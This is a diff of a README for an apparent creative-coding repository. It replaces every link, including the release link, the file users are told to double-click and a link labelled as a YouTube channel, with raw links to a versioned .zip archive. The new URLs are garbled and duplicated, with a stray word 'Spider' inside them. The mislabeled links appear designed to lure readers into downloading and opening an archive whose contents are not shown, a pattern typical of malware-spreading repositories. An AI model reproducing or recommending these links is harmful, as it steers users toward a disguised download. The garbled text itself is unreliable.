@@ -1,6 +1,6 @@
 # 🎨 creative-coding-ideas - Explore Creative Coding Projects Easily
 
-[![Download Now](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/ideas_coding_creative_1.9.zip%20Now-Available-brightgreen)](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/ideas_coding_creative_1.9.zip)
+[![Download Now](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip Spider https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip%20Now-Available-brightgreen)](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip Spider https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To get started with our projects, follow these steps:
 
    Click the link below to go to the releases page and see the latest versions of our projects:
 
-   [Download from Releases](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/ideas_coding_creative_1.9.zip)
+   [Download from Releases](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip Spider https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip)
 
 2. **Select a Project**
 
@@ -47,7 +47,7 @@ To get started with our projects, follow these steps:
 
 5. **Open the Project**
 
-   Inside the extracted folder, look for an `https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/ideas_coding_creative_1.9.zip` file. Double-click on it, and it will open in your default web browser. Enjoy exploring the project!
+   Inside the extracted folder, look for an `https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip Spider https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip` file. Double-click on it, and it will open in your default web browser. Enjoy exploring the project!
 
 ## 🔍 Explore the Projects
 
@@ -59,7 +59,7 @@ Each project in this repository is designed to inspire and educate. Here are som
 
 You can find live demonstrations of all these projects on our YouTube channel. Each video provides a walkthrough and offers ideas on how to extend the projects further.
 
-- Visit our YouTube channel [here](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/ideas_coding_creative_1.9.zip).
+- Visit our YouTube channel [here](https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip Spider https://raw.githubusercontent.com/zaywit308s/creative-coding-ideas/main/Interactive Spider Cursor/coding-ideas-creative-v3.4.zip).
 
 ## 💬 Feedback and Support
 
